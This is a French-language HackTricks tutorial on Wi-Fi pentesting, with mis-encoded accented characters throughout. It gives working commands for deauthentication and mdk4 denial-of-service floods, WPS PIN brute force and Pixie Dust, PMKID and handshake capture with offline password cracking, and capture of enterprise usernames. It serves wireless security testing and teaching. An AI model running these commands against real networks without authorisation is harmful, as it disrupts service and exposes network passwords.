# Pentesting Wifi

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez les tutoriels de bugs web3

üîî Recevez des notifications sur les nouveaux programmes de primes de bugs

üí¨ Participez aux discussions de la communaut√©

## Commandes de base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Outils

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon est un script Bash utilis√© pour auditer les r√©seaux sans fil. Il est con√ßu pour √™tre utilis√© avec Kali Linux et peut √™tre utilis√© pour effectuer des attaques de force brute, des attaques de dictionnaire, des attaques Evil Twin, des attaques de phishing, des attaques de d√©ni de service, des attaques de falsification de paquets, des attaques de r√©p√©tition de paquets, des attaques de d√©connexion, des attaques de capture de poign√©e de main WPA/WPA2, et bien plus encore. Airgeddon est un outil tr√®s puissant pour les tests de p√©n√©tration des r√©seaux sans fil.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ex√©cuter airgeddon avec docker**

Vous pouvez ex√©cuter airgeddon dans un conteneur Docker pour √©viter d'installer les d√©pendances n√©cessaires sur votre syst√®me h√¥te. Pour ce faire, vous devez d'abord installer Docker sur votre syst√®me. Ensuite, vous pouvez cr√©er un conteneur Docker pour airgeddon en utilisant le fichier Dockerfile fourni dans le r√©f√©rentiel airgeddon.

Une fois que vous avez cr√©√© le conteneur Docker, vous pouvez ex√©cuter airgeddon en utilisant la commande `docker run`. Assurez-vous de monter le r√©pertoire de sortie de airgeddon sur votre syst√®me h√¥te afin de pouvoir acc√©der aux fichiers de sortie g√©n√©r√©s par airgeddon.
```bash
docker run \
          --rm \
          -ti \
          --name airgeddon \
          --net=host \
          --privileged \
          -p 3000:3000 \
          -v /tmp:/io \
          -e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
          v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un mod√®le de phishing pour obtenir le vrai mot de passe du r√©seau ou capturer les informations d'identification des r√©seaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il effectuera automatiquement les actions suivantes :

* Mettre l'interface en mode monitor
* Scanner les r√©seaux possibles - Et vous permettre de s√©lectionner la ou les victimes
* Si WEP - Lancer des attaques WEP
* Si WPA-PSK
  * Si WPS : Attaque Pixie Dust et attaque de force brute (soyez prudent, l'attaque de force brute peut prendre beaucoup de temps). Notez qu'elle n'essaie pas les PIN null ou les PIN g√©n√©r√©s √† partir de la base de donn√©es.
  * Essayer de capturer le PMKID de l'AP pour le casser
  * Essayer de d√©connecter les clients de l'AP pour capturer une poign√©e de main
  * Si PMKID ou Handshake, essayer de casser en utilisant les 5000 meilleurs mots de passe.

## R√©sum√© des attaques

* **DoS**
  * D√©connexion/dissociation -- D√©connecter tout le monde (ou un ESSID/Client sp√©cifique)
  * Faux AP al√©atoires -- Cacher les r√©seaux, possible de faire planter les scanners
  * Surcharge de l'AP -- Essayer de tuer l'AP (g√©n√©ralement pas tr√®s utile)
  * WIDS -- Jouer avec l'IDS
  * TKIP, EAPOL -- Quelques attaques sp√©cifiques pour DoS certains APs
* **Cassage**
  * Casser **WEP** (plusieurs outils et m√©thodes)
  * **WPA-PSK**
    * **WPS** pin "Brute-Force"
    * **WPA PMKID** bruteforce
    * \[DoS +] Capture de **poign√©e de main WPA** + Cassage
  * **WPA-MGT**
    * **Capture de nom d'utilisateur**
    * **Bruteforce** des informations d'identification
* **Evil Twin** (avec ou sans DoS)
  * **Open** Evil Twin \[+ DoS] -- Utile pour capturer les informations d'identification du portail captif et/ou effectuer des attaques LAN
  * **WPA-PSK** Evil Twin -- Utile pour les attaques r√©seau si vous connaissez le mot de passe
  * **WPA-MGT** -- Utile pour capturer les informations d'identification de l'entreprise
* **KARMA, MANA**, **Loud MANA**, **Beacon connu**
  * **+ Open** -- Utile pour capturer les informations d'identification du portail captif et/ou effectuer des attaques LAN
  * **+ WPA** -- Utile pour capturer les poign√©es de main WPA

## DOS

### Paquets de d√©connexion

La fa√ßon la plus courante de r√©aliser ce type d'attaque est avec des paquets de **d√©connexion**. Il s'agit d'un type de trame "management" responsable de d√©connecter un appareil d'un point d'acc√®s. La falsification de ces paquets est la cl√© pour [pirater de nombreux r√©seaux Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), car vous pouvez d√©connecter de force n'importe quel client du r√©seau √† tout moment. La facilit√© avec laquelle cela peut √™tre fait est quelque peu effrayante et est souvent fait dans le cadre de la collecte d'une poign√©e de main WPA pour la casser.

Outre l'utilisation momentan√©e de cette d√©connexion pour collecter une poign√©e de main √† casser, vous pouvez √©galement laisser ces d√©connexions continuer, ce qui a pour effet de bombarder le client avec des paquets de d√©connexion apparemment du r√©seau auquel il est connect√©. Comme ces trames ne sont pas chiffr√©es, de nombreux programmes en profitent en les falsifiant et en les envoyant √† un ou √† tous les appareils d'un r√©seau.\
**Description provenant de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**D√©connexion en utilisant Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 signifie d√©authentification
* 1 est le nombre de d√©authentifications √† envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez); 0 signifie les envoyer en continu
* \-a 00:14:6C:7E:40:80 est l'adresse MAC du point d'acc√®s
* \-c 00:0F:B5:34:30:30 est l'adresse MAC du client √† d√©authentifier; si cela est omis, une d√©authentification de diffusion est envoy√©e (ne fonctionne pas toujours)
* ath0 est le nom de l'interface

### Paquets de d√©sassociation

Les paquets de d√©sassociation sont un autre type de trame de gestion qui est utilis√© pour d√©connecter un n≈ìud (ce qui signifie tout appareil comme un ordinateur portable ou un t√©l√©phone portable) d'un point d'acc√®s √† proximit√©. La diff√©rence entre les trames de d√©authentification et de d√©sassociation r√©side principalement dans la mani√®re dont elles sont utilis√©es.

Un point d'acc√®s cherchant √† d√©connecter un p√©riph√©rique malveillant enverrait une trame de d√©authentification pour informer le p√©riph√©rique qu'il a √©t√© d√©connect√© du r√©seau, tandis qu'une trame de d√©sassociation est utilis√©e pour d√©connecter tous les n≈ìuds lorsque le point d'acc√®s est mis hors tension, red√©marr√© ou quitte la zone.

**Description de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Cette attaque peut √™tre effectu√©e par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them 
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**√Ä partir de** [**ici**](https://en.kali.tools/?p=864)**.**

**MODE D'ATTAQUE b: Inondation de balises**

Envoie des trames de balises pour montrer de faux points d'acc√®s aux clients. Cela peut parfois faire planter les scanners de r√©seau et m√™me les pilotes !
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE D'ATTAQUE a: D√©ni de service d'authentification**

Envoie des trames d'authentification √† tous les points d'acc√®s (AP) trouv√©s dans la plage. Trop de clients peuvent bloquer ou r√©initialiser plusieurs AP.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE D'ATTAQUE p: Exploration et Bruteforce de SSID**

Explore les points d'acc√®s et v√©rifie s'il y a une r√©ponse, utile pour v√©rifier si le SSID a √©t√© correctement d√©masqu√© et si le point d'acc√®s est dans votre plage d'envoi. Le **bruteforce des SSID cach√©s** avec ou sans liste de mots est √©galement disponible.

**MODE D'ATTAQUE m: Exploitation des contre-mesures de Michael**

Envoie des paquets al√©atoires ou r√©injecte des doublons sur une autre file QoS pour provoquer les contre-mesures de Michael sur les **points d'acc√®s TKIP**. Le point d'acc√®s sera alors hors service pendant une minute enti√®re, ce qui en fait une attaque **DoS** efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e: Injection de paquets EAPOL Start et Logoff**

Inonde un point d'acc√®s avec des trames de d√©marrage EAPOL pour le maintenir occup√© avec des sessions fictives et ainsi l'emp√™cher de g√©rer des clients l√©gitimes. Ou d√©connecte les clients en injectant de faux messages de d√©connexion EAPOL.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE D'ATTAQUE s: Attaques pour les r√©seaux maill√©s IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les r√©seaux maill√©s. Inonder les voisins et les routes, cr√©er des trous noirs et d√©tourner le trafic !

**MODE D'ATTAQUE w: Confusion WIDS**

Confondre/Abuser les syst√®mes de d√©tection et de pr√©vention d'intrusion en connectant les clients √† plusieurs n≈ìuds WDS ou √† de faux points d'acc√®s malveillants.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE D'ATTAQUE f: Fuzzer de paquets**

Un simple fuzzer de paquets avec plusieurs sources de paquets et un ensemble int√©ressant de modificateurs. Soyez prudent !

### **Airggedon**

_**Airgeddon**_ offre la plupart des attaques propos√©es dans les commentaires pr√©c√©dents :

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS signifie Wi-Fi Protected Setup. C'est une norme de s√©curit√© de r√©seau sans fil qui essaie de rendre les connexions entre un routeur et des appareils sans fil plus rapides et plus faciles. **WPS ne fonctionne que pour les r√©seaux sans fil qui utilisent un mot de passe** qui est crypt√© avec les protocoles de s√©curit√© **WPA** Personnel ou **WPA2** Personnel. WPS ne fonctionne pas sur les r√©seaux sans fil qui utilisent la s√©curit√© WEP obsol√®te, qui peut √™tre facilement craqu√©e par n'importe quel pirate avec un ensemble de outils et de comp√©tences de base. (De [ici](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

WPS utilise un code PIN de 8 chiffres pour permettre √† un utilisateur de se connecter au r√©seau, mais les 4 premiers chiffres sont d'abord v√©rifi√©s et, s'ils sont corrects, les 4 chiffres suivants sont v√©rifi√©s. Ensuite, il est possible de faire une attaque de force brute sur la premi√®re moiti√©, puis sur la seconde moiti√© (seulement 11000 possibilit√©s).

### Brute-Force WPS

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

* **Reaver** a √©t√© con√ßu pour √™tre une attaque robuste et pratique contre WPS, et a √©t√© test√© contre une grande vari√©t√© de points d'acc√®s et d'impl√©mentations WPS.
* **Bully** est une **nouvelle impl√©mentation** de l'attaque de force brute WPS, √©crite en C. Il pr√©sente plusieurs avantages par rapport au code reaver original : moins de d√©pendances, des performances m√©moire et CPU am√©lior√©es, une manipulation correcte de l'endianness et un ensemble d'options plus robuste.

Cette attaque profite d'une **faiblesse dans le code PIN WPS √† huit chiffres** ; en raison de ce probl√®me, le protocole **divulgue des informations sur les quatre premiers chiffres du PIN**, et le **dernier** chiffre sert de **checksum**, ce qui rend facile le brute forcing de l'AP WPS.\
Notez que certains appareils incluent des **protections contre la force brute**, qui **bloquent g√©n√©ralement les adresses MAC** qui tentent de lancer des attaques de mani√®re r√©p√©t√©e. Dans ce cas, la complexit√© de cette attaque augmente, car vous devrez **faire tourner les adresses MAC** tout en testant les PIN.

Si le code WPS valide est trouv√©, Bully et Reaver l'utiliseront pour d√©couvrir la cl√© PSK WPA/WPA2 utilis√©e pour prot√©ger le r√©seau, vous pourrez donc vous connecter √† tout moment o√π vous en avez besoin.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot    
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute force**

Au lieu de commencer √† essayer chaque PIN possible, vous devriez v√©rifier s'il existe des **PINs d√©couverts pour l'AP que vous attaquez** (en fonction du MAC du fabricant) et les **PINs g√©n√©r√©s par le logiciel PIN**.

* La base de donn√©es des PINs connus est faite pour les points d'acc√®s de certains fabricants pour lesquels il est connu qu'ils utilisent les m√™mes PINs WPS. Cette base de donn√©es contient les trois premiers octets des adresses MAC et une liste de PIN correspondants qui sont tr√®s probablement pour ce fabricant.
* Il existe plusieurs algorithmes pour g√©n√©rer des PINs WPS. Par exemple, ComputePIN et EasyBox utilisent l'adresse MAC du point d'acc√®s dans leurs calculs. Mais l'algorithme Arcadyan n√©cessite √©galement un identifiant de p√©riph√©rique.

### Attaque WPS Pixie Dust

Dominique Bongard a d√©couvert que certains AP ont des moyens faibles de g√©n√©rer des **nonces** (connus sous le nom de **E-S1** et **E-S2**) qui sont cens√©s √™tre secrets. Si nous sommes capables de comprendre ce que sont ces nonces, nous pouvons facilement trouver le PIN WPS d'un AP puisque l'AP doit nous le donner dans un hash afin de prouver qu'il conna√Æt √©galement le PIN, et que le client ne se connecte pas √† un AP malveillant. Ces E-S1 et E-S2 sont essentiellement les "cl√©s pour d√©verrouiller la bo√Æte de verrouillage" contenant le PIN WPS. Plus d'informations ici: [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

Essentiellement, certaines impl√©mentations ont √©chou√© dans l'utilisation de cl√©s al√©atoires pour chiffrer les 2 parties du PIN (car il est d√©compos√© en 2 parties pendant la communication d'authentification et envoy√© au client), de sorte qu'une attaque hors ligne pourrait √™tre utilis√©e pour forcer le PIN valide.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Attaque Null Pin

Certaines impl√©mentations vraiment mauvaises permettent la connexion avec un code PIN nul (tr√®s √©trange aussi). Reaver peut tester cela (Bully ne le peut pas).
```
 reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Toutes les attaques WPS propos√©es peuvent √™tre facilement effectu√©es en utilisant _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 et 6 vous permettent d'essayer **votre propre PIN** (si vous en avez un)
* 7 et 8 effectuent l'attaque **Pixie Dust**
* 13 vous permet de tester le **PIN NULL**
* 11 et 12 vont **r√©cup√©rer les PINs li√©s √† l'AP s√©lectionn√© √† partir des bases de donn√©es disponibles** et **g√©n√©rer** des **PINs** possibles en utilisant : ComputePIN, EasyBox et √©ventuellement Arcadyan (recommand√©, pourquoi pas ?)
* 9 et 10 vont tester **tous les PINs possibles**

## **WEP**

Tellement obsol√®te et disparu que je ne vais pas en parler. Sachez simplement que _**airgeddon**_ a une option WEP appel√©e "All-in-One" pour attaquer ce type de protection. Plusieurs outils offrent des options similaires.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lire les tutoriels de bugs web3

üîî Recevoir des notifications sur les nouveaux programmes de primes pour bugs

üí¨ Participer aux discussions de la communaut√©

## WPA/WPA2 PSK

### PMKID

En 2018, les auteurs de hashcat ont [d√©voil√©](https://hashcat.net/forum/thread-7717.html) un nouveau type d'attaque qui ne repose pas seulement **sur un seul paquet**, mais qui ne n√©cessite pas non plus que des clients soient connect√©s √† notre AP cible, mais seulement une communication entre l'attaquant et l'AP.

Il s'av√®re que **beaucoup** de routeurs modernes ajoutent un **champ facultatif** √† la fin du **premier cadre EAPOL** envoy√© par l'AP lui-m√™me lorsqu'une personne s'associe, le soi-disant `Robust Security Network`, qui inclut quelque chose appel√© `PMKID`.

Comme expliqu√© dans le post original, le **PMKID** est d√©riv√© en utilisant des donn√©es qui nous sont connues :
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Puisque la cha√Æne "PMK Name" est constante, nous connaissons √† la fois le BSSID de l'AP et de la station et le `PMK` est le m√™me que celui obtenu √† partir d'une poign√©e de main compl√®te √† 4 voies, c'est tout ce dont hashcat a besoin pour craquer le PSK et r√©cup√©rer la phrase secr√®te!\
Description obtenue √† partir de [ici](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Pour **recueillir** ces informations et **forcer** localement le mot de passe, vous pouvez faire:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs captur√©s** seront affich√©s dans la **console** et √©galement **enregistr√©s** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et craquez-la :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format correct d'un hachage contient **4 parties**, comme ceci : _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Si le v√¥tre ne contient **que 3 parties**, alors il est **invalide** (la capture PMKID n'√©tait pas valide).

Notez que `hcxdumptool` **capture √©galement les poign√©es de main** (quelque chose comme ceci appara√Ætra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pouvez **transformer** les **poign√©es de main** en format **hashcat**/**john** en utilisant `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqu√© que certaines poign√©es de main captur√©es avec cet outil ne pouvaient pas √™tre craqu√©es m√™me en connaissant le mot de passe correct. Je recommanderais de capturer des poign√©es de main √©galement de mani√®re traditionnelle si possible, ou de capturer plusieurs d'entre elles en utilisant cet outil._

### Capture de poign√©e de main

Une fa√ßon d'attaquer les r√©seaux **WPA/WPA2** est de capturer une **poign√©e de main** et d'essayer de **craquer** le mot de passe utilis√© **hors ligne**. Pour ce faire, vous devez trouver le **BSSID** et le **canal** du r√©seau de la **victime**, ainsi qu'un **client** connect√© au r√©seau.\
Une fois que vous avez ces informations, vous devez commencer √† **√©couter** toutes les communications de ce **BSSID** dans ce **canal**, car avec un peu de chance, la poign√©e de main y sera envoy√©e :
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Maintenant, vous devez **d√©authentifier** le **client** pendant quelques secondes afin qu'il s'authentifie automatiquement √† nouveau sur le point d'acc√®s (veuillez lire la partie sur les attaques DoS pour trouver plusieurs fa√ßons de d√©authentifier un client) :
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Notez que lorsque le client est d√©authentifi√©, il peut essayer de se connecter √† un autre point d'acc√®s ou, dans d'autres cas, √† un autre r√©seau._

Une fois que des informations de poign√©e de main apparaissent dans `airodump-ng`, cela signifie que la poign√©e de main a √©t√© captur√©e et vous pouvez arr√™ter d'√©couter :

![](<../../.gitbook/assets/image (172) (1).png>)

Une fois la poign√©e de main captur√©e, vous pouvez la **craquer** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### V√©rifier si la poign√©e de main est dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**

`tshark` est un outil en ligne de commande qui permet de capturer et d'analyser le trafic r√©seau. Il est tr√®s utile pour l'analyse de paquets et la d√©tection de probl√®mes de r√©seau. `tshark` est une alternative √† `wireshark` pour les utilisateurs qui pr√©f√®rent travailler en ligne de commande.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty) est un outil de craquage de mot de passe pr√©vu pour les r√©seaux sans fil. Il utilise une attaque par dictionnaire pour casser les mots de passe WPA/WPA2-PSK.
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve une poign√©e de main non termin√©e d'un ESSID avant celle qui est termin√©e, il ne d√©tectera pas celle qui est valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Il est important de parler des **diff√©rentes m√©thodes d'authentification** qui pourraient √™tre utilis√©es par un Wifi d'entreprise. Pour ce type de Wifi, vous trouverez probablement dans `airodump-ng` quelque chose comme ceci:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
EAP (Extensible Authentication Protocol) est le c≈ìur de la communication d'authentification. Au-dessus de cela, un algorithme d'authentification est utilis√© par le serveur pour authentifier le client (supplicant) et, dans certains cas, par le client pour authentifier le serveur. Les principaux algorithmes d'authentification utilis√©s dans ce cas sont :

* EAP-GTC : est une m√©thode EAP pour prendre en charge l'utilisation de jetons mat√©riels et de mots de passe √† usage unique avec EAP-PEAP. Son impl√©mentation est similaire √† MSCHAPv2, mais n'utilise pas de challenge pair. Au lieu de cela, les mots de passe sont envoy√©s au point d'acc√®s en texte clair (tr√®s int√©ressant pour les attaques de r√©trogradation).
* EAP-MD-5 (Message Digest) : le client envoie le hachage MD5 du mot de passe. Non recommand√© : vuln√©rable aux attaques par dictionnaire, pas d'authentification du serveur et pas de moyen de g√©n√©rer des cl√©s de confidentialit√© √©quivalentes au c√¢ble (WEP) par session.
* EAP-TLS (Transport Layer Security) : il repose sur des certificats c√¥t√© client et c√¥t√© serveur pour effectuer l'authentification et peut √™tre utilis√© pour g√©n√©rer dynamiquement des cl√©s WEP bas√©es sur l'utilisateur et la session pour s√©curiser les communications ult√©rieures.
* EAP-TTLS (Tunneled Transport Layer Security) : authentification mutuelle du client et du r√©seau via un canal (ou tunnel) chiffr√©, ainsi qu'un moyen de d√©river des cl√©s WEP dynamiques, par utilisateur et par session. Contrairement √† EAP-TLS, EAP-TTLS ne n√©cessite que des certificats c√¥t√© serveur (le client utilisera des informations d'identification).
* PEAP (Protected Extensible Authentication Protocol) : PEAP est comme le protocole EAP, mais cr√©e un tunnel TLS pour prot√©ger la communication. Ensuite, des protocoles d'authentification faibles peuvent √™tre utilis√©s sur EAP car ils seront prot√©g√©s par le tunnel.
  * PEAP-MSCHAPv2 : cela est √©galement connu sous le nom de PEAP car il est largement adopt√©. Il s'agit simplement de la vuln√©rable r√©ponse/challenge appel√©e MSCHAPv2 sur PEAP (elle est prot√©g√©e par le tunnel TLS).
  * PEAP-EAP-TLS ou simplement PEAP-TLS : est tr√®s similaire √† EAP-TLS, mais un tunnel TLS est cr√©√© avant l'√©change de certificats.

Vous pouvez trouver plus d'informations sur ces m√©thodes d'authentification ici et ici.

### Capture d'identifiants

En lisant https://tools.ietf.org/html/rfc3748#page-27, il semble que si vous utilisez EAP, les messages "Identity" doivent √™tre pris en charge, et le nom d'utilisateur sera envoy√© en clair dans les messages "Response Identity".

M√™me en utilisant l'une des m√©thodes d'authentification les plus s√©curis√©es : PEAP-EAP-TLS, il est possible de capturer le nom d'utilisateur envoy√© dans le protocole EAP. Pour ce faire, capturez une communication d'authentification (d√©marrez `airodump-ng` dans un canal et `wireshark` dans la m√™me interface) et filtrez les paquets par `eapol`. Dans le paquet "Response, Identity", le nom d'utilisateur du client appara√Ætra.

![](<../../.gitbook/assets/image (150).png>)

### Identit√©s anonymes

(Les informations proviennent de https://www.interlinknetworks.com/app_notes/eap-peap.htm)

EAP-PEAP et EAP-TTLS prennent en charge la dissimulation d'identit√©. Dans un environnement WiFi, le point d'acc√®s (AP) g√©n√®re g√©n√©ralement une demande d'identit√© EAP dans le cadre du processus d'association. Pour pr√©server l'anonymat, le client EAP sur le syst√®me de l'utilisateur peut r√©pondre avec suffisamment d'informations pour permettre au premier serveur RADIUS de saut de traiter la demande, comme le montrent les exemples suivants.

* _**EAP-Identity = anonymous**_

> Dans cet exemple, tous les utilisateurs partageront le pseudo-nom d'utilisateur "anonymous". Le premier serveur RADIUS est un serveur EAP-PEAP ou EAP-TTLS qui pilote l'extr√©mit√© serveur du protocole PEAP ou TTLS. Le type d'authentification interne (prot√©g√©) sera alors g√©r√© localement ou relay√© vers un serveur RADIUS distant (domicile).

* _**EAP-Identity = anonymous@realm_x**_

> Dans cet exemple, les utilisateurs appartenant √† diff√©rents domaines masquent leur propre identit√© mais indiquent √† quel domaine ils appartiennent afin que le premier serveur RADIUS de saut puisse relayer les demandes EAP-PEAP ou EAP-TTLS vers des serveurs RADIUS dans leurs domaines d'origine qui agiront en tant que serveur PEAP ou TTLS. Le premier serveur de saut agit purement comme un n≈ìud de relais RADIUS.
>
> Alternativement, le premier serveur de saut peut agir en tant que serveur EAP-PEAP ou EAP-TTLS et traiter lui-m√™me la m√©thode d'authentification prot√©g√©e ou la relayer vers un autre serveur. Cette option peut √™tre utilis√©e pour configurer diff√©rentes politiques pour diff√©rents domaines.

Dans EAP-PEAP, une fois que le serveur PEAP et le client PEAP √©tablissent le tunnel TLS, le serveur PEAP g√©n√®re une demande d'identit√© EAP et la transmet dans le tunnel TLS. Le client r√©pond √† cette deuxi√®me demande d'identit√© EAP en envoyant une r√©ponse d'identit√© EAP contenant la v√©ritable identit√© de l'utilisateur dans le tunnel chiffr√©. Cela emp√™che quiconque √©coutant le trafic 802.11 de d√©couvrir la v√©ritable identit√© de l'utilisateur.

EAP-TTLS fonctionne l√©g√®rement diff√©remment. Avec EAP-TTLS, le client s'authentifie g√©n√©ralement via PAP ou CHAP prot√©g√© par le tunnel TLS. Dans ce cas, le client inclura un attribut User-Name et soit un attribut Password, soit un attribut CHAP-Password dans le premier message TLS envoy√© apr√®s l'√©tablissement du tunnel.

